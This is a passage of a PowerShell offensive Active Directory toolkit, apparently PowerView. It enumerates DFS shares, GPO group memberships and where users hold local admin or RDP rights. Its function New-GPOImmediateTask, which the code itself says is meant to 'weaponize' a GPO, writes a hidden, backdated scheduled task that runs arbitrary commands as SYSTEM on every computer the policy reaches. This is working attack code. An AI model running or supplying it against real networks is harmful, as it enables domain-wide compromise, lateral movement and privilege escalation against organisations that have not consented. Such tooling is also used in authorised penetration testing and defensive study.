                    $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                    $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                    $reserved_blob_size_end = $reserved_blob_size_start + 3
                    $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                    $reserved_blob_start = $reserved_blob_size_end + 1
                    $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                    $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                    $referral_ttl_start = $reserved_blob_end + 1
                    $referral_ttl_end = $referral_ttl_start + 3
                    $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                    
                    $target_count_start = 0
                    $target_count_end = $target_count_start + 3
                    $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                    $t_offset = $target_count_end + 1

                    for($j=1; $j -le $target_count; $j++){
                        $target_entry_size_start = $t_offset
                        $target_entry_size_end = $target_entry_size_start + 3
                        $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                        $target_time_stamp_start = $target_entry_size_end + 1
                        $target_time_stamp_end = $target_time_stamp_start + 7
                        
                        $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                        $target_state_start = $target_time_stamp_end + 1
                        $target_state_end = $target_state_start + 3
                        $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                        $target_type_start = $target_state_end + 1
                        $target_type_end = $target_type_start + 3
                        $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                        $server_name_size_start = $target_type_end + 1
                        $server_name_size_end = $server_name_size_start + 1
                        $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                        $server_name_start = $server_name_size_end + 1
                        $server_name_end = $server_name_start + $server_name_size - 1
                        $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                        $share_name_size_start = $server_name_end + 1
                        $share_name_size_end = $share_name_size_start + 1
                        $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                        $share_name_start = $share_name_size_end + 1
                        $share_name_end = $share_name_start + $share_name_size - 1
                        $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                        $target_list += "\\$server_name\$share_name"
                        $t_offset = $share_name_end + 1
                    }
                }
            }
            $offset = $blob_data_end + 1
            $dfs_pkt_properties = @{
                'Name' = $blob_name
                'Prefix' = $prefix
                'TargetList' = $target_list
            }
            $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
            $prefix = $null
            $blob_name = $null
            $target_list = $null
        }

        $servers = @()
        $object_list | ForEach-Object {
            if ($_.TargetList) {
                $_.TargetList | ForEach-Object {
                    $servers += $_.split("\")[2]
                }
            }
        }

        $servers
    }

    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)]
            [Int]
            $PageSize = 200,

            [Management.Automation.PSCredential]
            $Credential
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=fTDfs))"

            try {
                $Results = $DFSSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $RemoteNames = $Properties.remoteservername
                    $Pkt = $Properties.pkt

                    $DFSshares += $RemoteNames | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Verbose "Error in parsing DFS share : $_"
                        }
                    }
                }
                $Results.dispose()
                $DFSSearcher.dispose()

                if($pkt -and $pkt[0]) {
                    Parse-Pkt $pkt[0] | ForEach-Object {
                        
                        
                        
                        
                        
                        if ($_ -ne "null") {
                            New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                        }
                    }
                }
            }
            catch {
                Write-Warning "Get-DFSshareV1 error : $_"
            }
            $DFSshares | Sort-Object -Property "RemoteServerName"
        }
    }

    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200,

            [Management.Automation.PSCredential]
            $Credential
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=msDFS-Linkv2))"
            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

            try {
                $Results = $DFSSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $target_list = $Properties.'msdfs-targetlistv2'[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                    $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                        try {
                            $Target = $_.InnerText
                            if ( $Target.Contains('\') ) {
                                $DFSroot = $Target.split("\")[3]
                                $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Verbose "Error in parsing target : $_"
                        }
                    }
                }
                $Results.dispose()
                $DFSSearcher.dispose()
            }
            catch {
                Write-Warning "Get-DFSshareV2 error : $_"
            }
            $DFSshares | Sort-Object -Unique -Property "RemoteServerName"
        }
    }

    $DFSshares = @()

    if ( ($Version -eq "all") -or ($Version.endsWith("1")) ) {
        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq "all") -or ($Version.endsWith("2")) ) {
        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }

    $DFSshares | Sort-Object -Property ("RemoteServerName","Name") -Unique
}









filter Get-GptTmpl {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,

        [Switch]
        $UsePSDrive
    )

    if($UsePSDrive) {
        
        $Parts = $GptTmplPath.split('\')
        $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
        $FilePath = $Parts[-1]
        $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''

        Write-Verbose "Mounting path $GptTmplPath using a temp PSDrive at $RandDrive"

        try {
            $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
        }
        catch {
            Write-Verbose "Error mounting path $GptTmplPath : $_"
            return $Null
        }

        
        $TargetGptTmplPath = $RandDrive + ":\" + $FilePath
    }
    else {
        $TargetGptTmplPath = $GptTmplPath
    }

    Write-Verbose "GptTmplPath: $GptTmplPath"

    try {
        Write-Verbose "Parsing $TargetGptTmplPath"
        $TargetGptTmplPath | Get-IniContent -ErrorAction SilentlyContinue
    }
    catch {
        Write-Verbose "Error parsing $TargetGptTmplPath : $_"
    }

    if($UsePSDrive -and $RandDrive) {
        Write-Verbose "Removing temp PSDrive $RandDrive"
        Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive -Force
    }
}


filter Get-GroupsXML {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,

        [Switch]
        $UsePSDrive
    )

    if($UsePSDrive) {
        
        $Parts = $GroupsXMLPath.split('\')
        $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
        $FilePath = $Parts[-1]
        $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''

        Write-Verbose "Mounting path $GroupsXMLPath using a temp PSDrive at $RandDrive"

        try {
            $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
        }
        catch {
            Write-Verbose "Error mounting path $GroupsXMLPath : $_"
            return $Null
        }

        
        $TargetGroupsXMLPath = $RandDrive + ":\" + $FilePath
    }
    else {
        $TargetGroupsXMLPath = $GroupsXMLPath
    }

    try {
        [XML]$GroupsXMLcontent = Get-Content $TargetGroupsXMLPath -ErrorAction Stop

        
        $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

            $Groupname = $_.Properties.groupName

            
            $GroupSID = $_.Properties.groupSid
            if(-not $GroupSID) {
                if($Groupname -match 'Administrators') {
                    $GroupSID = 'S-1-5-32-544'
                }
                elseif($Groupname -match 'Remote Desktop') {
                    $GroupSID = 'S-1-5-32-555'
                }
                elseif($Groupname -match 'Guests') {
                    $GroupSID = 'S-1-5-32-546'
                }
                else {
                    $GroupSID = Convert-NameToSid -ObjectName $Groupname | Select-Object -ExpandProperty SID
                }
            }

            
            $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                if($_.sid) { $_.sid }
                else { $_.name }
            }

            if ($Members) {

                
                if($_.filters) {
                    $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                        New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                    }
                }
                else {
                    $Filters = $Null
                }

                if($Members -isnot [System.Array]) { $Members = @($Members) }

                $GPOGroup = New-Object PSObject
                $GPOGroup | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                $GPOGroup | Add-Member Noteproperty 'Filters' $Filters
                $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Null
                $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Members
                $GPOGroup
            }
        }
    }
    catch {
        Write-Verbose "Error parsing $TargetGroupsXMLPath : $_"
    }

    if($UsePSDrive -and $RandDrive) {
        Write-Verbose "Removing temp PSDrive $RandDrive"
        Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive -Force
    }
}


function Get-NetGPO {

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $ComputerName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if ($GPOSearcher) {

            if($ComputerName) {
                $GPONames = @()
                $Computers = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize

                if(!$Computers) {
                    throw "Computer $ComputerName in domain '$Domain' not found! Try a fully qualified host name"
                }
                
                
                $ComputerOUs = @()
                ForEach($Computer in $Computers) {
                    
                    $DN = $Computer.distinguishedname

                    $ComputerOUs += $DN.split(",") | ForEach-Object {
                        if($_.startswith("OU=")) {
                            $DN.substring($DN.indexof($_))
                        }
                    }
                }
                
                Write-Verbose "ComputerOUs: $ComputerOUs"

                
                ForEach($ComputerOU in $ComputerOUs) {
                    $GPONames += Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $ComputerOU -FullData -PageSize $PageSize | ForEach-Object { 
                        
                        write-verbose "blah: $($_.name)"
                        $_.gplink.split("][") | ForEach-Object {
                            if ($_.startswith("LDAP")) {
                                $_.split(";")[0]
                            }
                        }
                    }
                }
                
                Write-Verbose "GPONames: $GPONames"

                
                $ComputerSite = (Get-SiteName -ComputerName $ComputerName).SiteName
                if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                    $GPONames += Get-NetSite -SiteName $ComputerSite -FullData | ForEach-Object {
                        if($_.gplink) {
                            $_.gplink.split("][") | ForEach-Object {
                                if ($_.startswith("LDAP")) {
                                    $_.split(";")[0]
                                }
                            }
                        }
                    }
                }

                $GPONames | Where-Object{$_ -and ($_ -ne '')} | ForEach-Object {

                    
                    $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_ -PageSize $PageSize
                    $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"

                    try {
                        $Results = $GPOSearcher.FindAll()
                        $Results | Where-Object {$_} | ForEach-Object {
                            $Out = Convert-LDAPProperty -Properties $_.Properties
                            $Out | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $Out
                        }
                        $Results.dispose()
                        $GPOSearcher.dispose()
                    }
                    catch {
                        Write-Warning $_
                    }
                }
            }

            else {
                if($DisplayName) {
                    $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
                }
                else {
                    $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
                }

                try {
                    $Results = $GPOSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        if($ADSPath -and ($ADSpath -Match '^GC://')) {
                            $Properties = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $Properties.distinguishedname
                                $GPODomain = $GPODN.subString($GPODN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($Properties.cn)"
                                $Properties | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                                $Properties
                            }
                            catch {
                                $Properties
                            }
                        }
                        else {
                            
                            Convert-LDAPProperty -Properties $_.Properties
                        }
                    }
                    $Results.dispose()
                    $GPOSearcher.dispose()
                }
                catch {
                    Write-Warning $_
                }
            }
        }
    }
}


function New-GPOImmediateTask {

    [CmdletBinding(DefaultParameterSetName = 'Create')]
    Param (
        [Parameter(ParameterSetName = 'Create', Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskName,

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command = 'powershell',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $CommandArguments,

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskDescription = '',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskAuthor = 'NT AUTHORITY\System',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskModifiedDate = (Get-Date (Get-Date).AddDays(-30) -Format u).trim("Z"),

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPOname,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPODisplayName,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $DomainController,
        
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $ADSpath,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Force,

        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Remove,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]        
        [Management.Automation.PSCredential]
        $Credential
    )

    
    $TaskXML = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="'+$TaskName+'" image="0" changed="'+$TaskModifiedDate+'" uid="{'+$([guid]::NewGuid())+'}" userContext="0" removePolicy="0"><Properties action="C" name="'+$TaskName+'" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author>'+$TaskAuthor+'</Author><Description>'+$TaskDescription+'</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>S4U</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>'+$Command+'</Command><Arguments>'+$CommandArguments+'</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2></ScheduledTasks>'

    if (!$PSBoundParameters['GPOname'] -and !$PSBoundParameters['GPODisplayName']) {
        Write-Warning 'Either -GPOName or -GPODisplayName must be specified'
        return
    }

    
    $GPOs = Get-NetGPO -GPOname $GPOname -DisplayName $GPODisplayName -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -Credential $Credential 
    
    if(!$GPOs) {
        Write-Warning 'No GPO found.'
        return
    }

    $GPOs | ForEach-Object {
        $ProcessedGPOName = $_.Name
        try {
            Write-Verbose "Trying to weaponize GPO: $ProcessedGPOName"

            
            if($Credential) {
                Write-Verbose "Mapping '$($_.gpcfilesyspath)' to network drive N:\"
                $Path = $_.gpcfilesyspath.TrimEnd('\')
                $Net = New-Object -ComObject WScript.Network
                $Net.MapNetworkDrive("N:", $Path, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                $TaskPath = "N:\Machine\Preferences\ScheduledTasks\"
            }
            else {
                $TaskPath = $_.gpcfilesyspath + "\Machine\Preferences\ScheduledTasks\"
            }

            if($Remove) {
                if(!(Test-Path "$TaskPath\ScheduledTasks.xml")) {
                    Throw "Scheduled task doesn't exist at $TaskPath\ScheduledTasks.xml"
                }

                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Removing schtask at $TaskPath\ScheduledTasks.xml")) {
                    return
                }

                Remove-Item -Path "$TaskPath\ScheduledTasks.xml" -Force
            }
            else {
                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Creating schtask at $TaskPath\ScheduledTasks.xml")) {
                    return
                }
                
                
                $Null = New-Item -ItemType Directory -Force -Path $TaskPath

                if(Test-Path "$TaskPath\ScheduledTasks.xml") {
                    Throw "Scheduled task already exists at $TaskPath\ScheduledTasks.xml !"
                }

                $TaskXML | Set-Content -Encoding ASCII -Path "$TaskPath\ScheduledTasks.xml"
            }

            if($Credential) {
                Write-Verbose "Removing mounted drive at N:\"
                $Net = New-Object -ComObject WScript.Network
                $Net.RemoveNetworkDrive("N:")
            }
        }
        catch {
            Write-Warning "Error for GPO $ProcessedGPOName : $_"
            if($Credential) {
                Write-Verbose "Removing mounted drive at N:\"
                $Net = New-Object -ComObject WScript.Network
                $Net.RemoveNetworkDrive("N:")
            }
        }
    }
}


function Get-NetGPOGroup {


    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $ResolveMemberSIDs,

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Option = [System.StringSplitOptions]::RemoveEmptyEntries

    
    Get-NetGPO -GPOName $GPOname -DisplayName $DisplayName -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | ForEach-Object {

        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        $GPOPath = $_.gpcfilesyspath

        $ParseArgs =  @{
            'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            'UsePSDrive' = $UsePSDrive
        }

        
        $Inf = Get-GptTmpl @ParseArgs

        if($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {

            $Memberships = @{}

            
            ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                $Group, $Relation = $Membership.Key.Split('__', $Option) | ForEach-Object {$_.Trim()}

                
                $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                if($ResolveMemberSIDs) {
                    
                    $GroupMembers = @()
                    ForEach($Member in $MembershipValue) {
                        if($Member -and ($Member.Trim() -ne '')) {
                            if($Member -notmatch '^S-1-.*') {
                                $MemberSID = Convert-NameToSid -Domain $Domain -ObjectName $Member | Select-Object -ExpandProperty SID
                                if($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $MembershipValue = $GroupMembers
                }

                if(-not $Memberships[$Group]) {
                    $Memberships[$Group] = @{}
                }
                if($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                $Memberships[$Group].Add($Relation, $MembershipValue)
            }

            ForEach ($Membership in $Memberships.GetEnumerator()) {
                if($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                    
                    $GroupSID = $Membership.Key.Trim('*')
                    if($GroupSID -and ($GroupSID.Trim() -ne '')) {
                        $GroupName = Convert-SidToName -SID $GroupSID
                    }
                    else {
                        $GroupName = $False
                    }
                }
                else {
                    $GroupName = $Membership.Key

                    if($GroupName -and ($GroupName.Trim() -ne '')) {
                        if($Groupname -match 'Administrators') {
                            $GroupSID = 'S-1-5-32-544'
                        }
                        elseif($Groupname -match 'Remote Desktop') {
                            $GroupSID = 'S-1-5-32-555'
                        }
                        elseif($Groupname -match 'Guests') {
                            $GroupSID = 'S-1-5-32-546'
                        }
                        elseif($GroupName.Trim() -ne '') {
                            $GroupSID = Convert-NameToSid -Domain $Domain -ObjectName $Groupname | Select-Object -ExpandProperty SID
                        }
                        else {
                            $GroupSID = $Null
                        }
                    }
                }

                $GPOGroup = New-Object PSObject
                $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                $GPOGroup
            }
        }

        $ParseArgs =  @{
            'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            'UsePSDrive' = $UsePSDrive
        }

        Get-GroupsXML @ParseArgs | ForEach-Object {
            if($ResolveMemberSIDs) {
                $GroupMembers = @()
                ForEach($Member in $_.GroupMembers) {
                    if($Member -and ($Member.Trim() -ne '')) {
                        if($Member -notmatch '^S-1-.*') {
                            
                            $MemberSID = Convert-NameToSid -Domain $Domain -ObjectName $Member | Select-Object -ExpandProperty SID
                            if($MemberSID) {
                                $GroupMembers += $MemberSID
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                        else {
                            $GroupMembers += $Member
                        }
                    }
                }
                $_.GroupMembers = $GroupMembers
            }

            $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
            $_ | Add-Member Noteproperty 'GPOName' $GPOName
            $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
            $_
        }
    }
}


function Find-GPOLocation {


    [CmdletBinding()]
    Param (
        [String]
        $UserName,

        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $LocalGroup = 'Administrators',
        
        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($UserName) {
        
        $User = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1
        $UserSid = $User.objectsid

        if(-not $UserSid) {    
            Throw "User '$UserName' not found!"
        }

        $TargetSIDs = @($UserSid)
        $ObjectSamAccountName = $User.samaccountname
        $TargetObject = $UserSid
    }
    elseif($GroupName) {
        
        $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -First 1
        $GroupSid = $Group.objectsid

        if(-not $GroupSid) {    
            Throw "Group '$GroupName' not found!"
        }

        $TargetSIDs = @($GroupSid)
        $ObjectSamAccountName = $Group.samaccountname
        $TargetObject = $GroupSid
    }
    else {
        $TargetSIDs = @('*')
    }

    
    if($LocalGroup -like "*Admin*") {
        $TargetLocalSID = 'S-1-5-32-544'
    }
    elseif ( ($LocalGroup -like "*RDP*") -or ($LocalGroup -like "*Remote*") ) {
        $TargetLocalSID = 'S-1-5-32-555'
    }
    elseif ($LocalGroup -like "S-1-5-*") {
        $TargetLocalSID = $LocalGroup
    }
    else {
        throw "LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' SID format."
    }

    
    
    if($TargetSIDs[0] -and ($TargetSIDs[0] -ne '*')) {
        $TargetSIDs += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $ObjectSamAccountName -RawSids
    }

    if(-not $TargetSIDs) {
        throw "No effective target SIDs!"
    }

    Write-Verbose "TargetLocalSID: $TargetLocalSID"
    Write-Verbose "Effective target SIDs: $TargetSIDs"

    $GPOGroupArgs =  @{
        'Domain' = $Domain
        'DomainController' = $DomainController
        'UsePSDrive' = $UsePSDrive
        'ResolveMemberSIDs' = $True
        'PageSize' = $PageSize
    }

    
    $GPOgroups = Get-NetGPOGroup @GPOGroupArgs | ForEach-Object {

        $GPOgroup = $_

        
        
        if($GPOgroup.GroupSID -match $TargetLocalSID) {
            $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                    $GPOgroup
                }
            }
        }
        
        if( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
            if( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                $GPOgroup
            }
        }
    } | Sort-Object -Property GPOName -Unique

    $GPOgroups | ForEach-Object {

        $GPOname = $_.GPODisplayName
        $GPOguid = $_.GPOName
        $GPOPath = $_.GPOPath
        $GPOType = $_.GPOType
        if($_.GroupMembers) {
            $GPOMembers = $_.GroupMembers
        }
        else {
            $GPOMembers = $_.GroupSID
        }
        
        $Filters = $_.Filters

        if(-not $TargetObject) {
            
            
            $TargetObjectSIDs = $GPOMembers
        }
        else {
            $TargetObjectSIDs = $TargetObject
        }

        
        Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData -PageSize $PageSize | ForEach-Object {
            if($Filters) {
                
                
                $OUComputers = Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
                    $_.adspath -match ($Filters.Value)
                } | ForEach-Object { $_.dnshostname }
            }
            else {
                $OUComputers = Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_.ADSpath -PageSize $PageSize
            }

            if($OUComputers) {
                if($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-ADObject -SID $TargetSid -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $GPOLocation = New-Object PSObject
                    $GPOLocation | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $GPOLocation | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOLocation | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $GPOLocation | Add-Member Noteproperty 'Domain' $Domain
                    $GPOLocation | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GPOLocation | Add-Member Noteproperty 'GPODisplayName' $GPOname
                    $GPOLocation | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                    $GPOLocation | Add-Member Noteproperty 'GPOPath' $GPOPath
